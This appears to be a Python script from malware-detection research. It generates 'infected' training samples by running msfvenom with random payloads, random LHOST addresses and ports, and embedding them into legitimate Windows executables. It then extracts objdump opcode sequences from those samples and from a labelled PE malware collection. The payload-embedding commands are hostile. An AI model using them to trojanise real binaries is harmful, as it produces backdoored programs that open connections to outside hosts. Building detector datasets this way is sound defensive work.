import os
import random
import shutil
from payloads import *
import subprocess
import json
import csv


def to_string(x, min_length=4):
    x = str(x)
    if len(x) >= min_length:
        return x
    return ('0' * (min_length - len(x))) + x


def get_random_ip(r):
    return f'{r.randint(0, 255)}' \
           f'.{r.randint(0, 255)}' \
           f'.{r.randint(0, 255)}' \
           f'.{r.randint(0, 255)}'


def prep_raw_executables(r):
    dir_path = os.path.dirname(os.path.realpath(__file__))
    arr = os.listdir(dir_path + '/raw-executables/')

    if '.DS_Store' in arr:
        arr.remove('.DS_Store')
    print(dir_path)

    r.shuffle(arr)

    training_files = arr[:-499]
    testing_files = arr[-500:]

    with open('training_files.txt', 'w') as f:
        for file_name in training_files:
            f.write(file_name + "\n")

    with open('testing_files.txt', 'w') as f:
        for file_name in testing_files:
            f.write(file_name + "\n")

    total_corruption_percentage = 0.3

    training_corruption_threshold = 0# int(len(training_files) * (1 - total_corruption_percentage))
    testing_corruption_threshold = int(len(testing_files) * (1 - total_corruption_percentage))

    errors = []
    for index, training_file in enumerate(training_files):
        extension = training_file[-3:]

        if index < training_corruption_threshold:
            file_name = f'{training_file[:-4]}_control.{extension}'
            shutil.copy(f'{dir_path}/raw-executables/{training_file}', f'{dir_path}/raw/training/{file_name}')
        else:
            file_name = f'{training_file[:-4]}_infected.{extension}'
            shutil.copy(f'{dir_path}/raw-executables/{training_file}', f'{dir_path}/raw/training/{file_name}')

            metasploit_command = f'msfvenom ' \
                                 f'-p {get_random_payload(random)} ' \
                                 f'-f {extension} ' \
                                 f'LHOST={get_random_ip(random)} ' \
                                 f'LPORT={random.randint(1, 999)} ' \
                                 f'-x {dir_path}/raw/training/{file_name} ' \
                                 f'> {dir_path}/raw/training/{file_name}'

            error = os.system(metasploit_command)
            if error > 0:
                errors += [PAYLOADS[index % len(PAYLOADS)].replace("payload/", "")]

    for index, testing_file in enumerate(testing_files):
        extension = testing_file[-3:]

        if index < testing_corruption_threshold:
            file_name = f'{training_file[:-4]}_control.{extension}'
            shutil.copy(f'{dir_path}/raw-executables/{testing_file}', f'{dir_path}/raw/testing/{file_name}')
        else:
            # file_name = f'{to_string(index - testing_corruption_threshold)}_infected_testing.{extension}'
            file_name = f'{training_file[:-4]}_infected.{extension}'
            shutil.copy(f'{dir_path}/raw-executables/{testing_file}', f'{dir_path}/raw/testing/{file_name}')

            metasploit_command = f'msfvenom ' \
                                 f'-p {get_random_payload(random)} ' \
                                 f'-f {extension} ' \
                                 f'LHOST={get_random_ip(random)} ' \
                                 f'LPORT={random.randint(1, 999)} ' \
                                 f'> {dir_path}/raw/testing/{file_name}'

            error = os.system(metasploit_command)
            if error > 0:
                errors += [PAYLOADS[index % len(PAYLOADS)].replace("payload/", "")]

    print(errors)


def prep_raw_executables_benfords(r):

    dir_path = os.path.dirname(os.path.realpath(__file__))
    arr = os.listdir(dir_path + '/raw-executables/')

    if '.DS_Store' in arr:
        arr.remove('.DS_Store')

    r.shuffle(arr)

    errors = []
    for index, training_file in enumerate(arr):
        extension = training_file[-3:]

        if extension == "exe":
            file_path_control = f'{dir_path}/raw/benford/{training_file[:-4]}_control.{extension}'
            shutil.copy(f'{dir_path}/raw-executables/{training_file}', file_path_control)

            file_name = f'{training_file[:-4]}_infected.{extension}'
            shutil.copy(f'{dir_path}/raw-executables/{training_file}', f'{dir_path}/raw/benford/{file_name}')

            metasploit_command = f'msfvenom ' \
                                 f'-p {get_random_payload(random)} ' \
                                 f'-f {extension} ' \
                                 f'LHOST={get_random_ip(random)} ' \
                                 f'LPORT={random.randint(1, 999)} ' \
                                 f'-x {file_path_control} ' \
                                 f'> {dir_path}/raw/benford/{file_name}'

            error = os.system(metasploit_command)
            if error > 0:
                errors += [PAYLOADS[index % len(PAYLOADS)].replace("payload/", "")]
    print(errors)


def write_op_code_data_to_json(version):

    if not(version == "train" or version == "testing" or version == "benford"):
        raise Exception(f"Version needs to be train or test, got {version}")

    dir_path = os.path.dirname(os.path.realpath(__file__))
    arr = os.listdir(dir_path + f'/raw/{version}/')
    arr = sorted(arr)
    i_ = 0
    failed = []
    for i_, file_name in enumerate(arr[:10]):

        print(file_name)
        cmd = f"objdump -d {dir_path}/raw/{version}/{file_name}"

        result = None

        try:
            result = subprocess.run([cmd], shell=True, check=True, stdout=subprocess.PIPE) #, stderr=subprocess.PIPE)

        except subprocess.CalledProcessError as e:

            failed += [file_name]

        if result is not None and result.stdout is not None:
            result = result.stdout
            result = result.decode('ascii')
            result = result[result.find('<.text>:') + len('<.text>:'):].strip()

            result_lines = result.split('\n')
            rows = []

            s = ""
            for index, r in enumerate(result_lines):
                adjusted_line = r
                line = {'index': index}
                line.update({'line': adjusted_line[:adjusted_line.find(':')]})
                adjusted_line = adjusted_line.replace(line['line'] + ":", "").strip()

                hex = adjusted_line[:adjusted_line.find('\t')]
                adjusted_line = adjusted_line.replace(hex, "").strip()
                line.update({"hex": hex.split()})

                operation_index = min(len(adjusted_line), adjusted_line.find('\t') if adjusted_line.find('\t') > 0 else 999)
                operation = adjusted_line[:operation_index].strip()
                adjusted_line = adjusted_line.replace(operation, "").strip()
                line.update({"operation": operation})

                line.update({'extras': [x.replace(",", "") for x in adjusted_line.split()]})

                s += operation + "\n"
                # rows += [line]

            extension = file_name[-3:]
            root_file = file_name.replace(".exe", "").replace(".dll", "")

            op_code_dictionary = {'op_codes': rows, 'extension': extension}
            print(f"/op_codes/testing/{root_file}.txt")
            # with open(dir_path + f"/op_codes/{version}/{root_file}.txt", "w") as outfile:
            with open(dir_path + f"/op_codes/testing/{root_file}.txt", "w") as outfile:
                # json.dump(op_code_dictionary, outfile)
                outfile.write(s)

    failed = list(set(failed))
    print(failed)
    print(len(failed), i_)


def remove_invalid_files():
    dir_path = os.path.dirname(os.path.realpath(__file__))
    arr = os.listdir(dir_path + f'/raw-executables/')
    # arr = os.listdir(dir_path + f'/raw/{version}ing/')

    i_ = 0
    failed = []
    for i_, file_name in enumerate(arr):

        cmd = f"objdump -d {dir_path}/raw-executables/{file_name}"
        # cmd = f"objdump -d {dir_path}/raw/{version}ing/{file_name}"

        result = None

        try:
            result = subprocess.run([cmd], shell=True, check=True, stdout=subprocess.PIPE)

        except subprocess.CalledProcessError as e:

            failed += [file_name]
            os.remove(f"{dir_path}/raw-executables/{file_name}")

    print(f'{len(failed)} files removed.')


def get_op_code_array(source):

    cmd = f"objdump -d {source}"

    try:
        result = subprocess.run([cmd], shell=True, check=True, stdout=subprocess.PIPE)  # , stderr=subprocess.PIPE)

    except subprocess.CalledProcessError as e:
        raise Exception("Failed to obj dump")

    if result is not None and result.stdout is not None:

        def func(a):
            b = a
            a = a[a.find(':')+1:].strip()
            a = a[a.find('\t'):].strip()
            operation_index = min(
                len(a),
                a.find('\t') if a.find('\t') > 0 else 999)
            operation = a[:operation_index].strip()
            return operation

        result = result.stdout
        result = result.decode('ascii')
        result = result[result.find('<.text>:') + len('<.text>:'):].strip()

        result_lines = result.split('\n')
        return list(map(func, result_lines))
    raise Exception("Failed to obtain op codes")


def write_files_from_external_collection_to_external_ops(
        samples=7000
):

    with open("/Volumes/MALWARE/pe_machine_learning_set/pe-machine-learning-dataset/samples.csv") as f:
        reader = csv.DictReader(f)

        files = list(reader)

    clean = list(
        filter(
            lambda a: a['list'] == 'Whitelist',
            files
        )
    )

    infected = list(
        filter(
            lambda a: a['list'] == 'Blacklist',
            files
        )
    )

    random.shuffle(clean)
    random.shuffle(infected)

    for i, f in enumerate(clean[:samples]):
        if (i + 1) % 1000 == 0:
            print(f"{i + 1} Clean")
        try:
            arr = get_op_code_array(
                f"/Volumes/MALWARE/pe_machine_learning_set/pe-machine-learning-dataset/samples/{f['id']}"
            )
            with open(
                    f"/Volumes/MALWARE/pe_machine_learning_set/pe-machine-learning-dataset/op_code_samples/clean_{f['id']}.txt", "w") \
                    as f:
                f.write("\n".join(arr))
        except:
            pass

    for i, f in enumerate(infected[:samples]):
        if (i + 1) % 1000 == 0:
            print(f"{i + 1} Infected")
        try:
            arr = get_op_code_array(
                f"/Volumes/MALWARE/pe_machine_learning_set/pe-machine-learning-dataset/samples/{f['id']}"
            )
            with open(f"/Volumes/MALWARE/pe_machine_learning_set/pe-machine-learning-dataset/op_code_samples/infected_{f['id']}.txt", "w") as f:
                f.write("\n".join(arr))
        except:
            pass


if __name__ == "__main__":

    random.seed(9)
    # prep_raw_executables_benfords(random)

    #
    # prep_raw_executables(random)
    # write_op_code_data_to_json("train")
    # write_op_code_data_to_json("testing")
    # write_op_code_data_to_json("benford")

    write_files_from_external_collection_to_external_ops()

    # dir_path = os.path.dirname(os.path.realpath(__file__))
    # arr = os.listdir("/Volumes/MALWARE/pe_machine_learning_set/pe-machine-learning-dataset/op_code_samples/")
    # arr = sorted(arr)
    #
    # print(f'Total files {len(arr)}')
    # print(f'Control files {len(list(filter(lambda a: "clean" in a, arr)))}')
    # print(f'Infected files {len(list(filter(lambda a: "infected" in a, arr)))}')

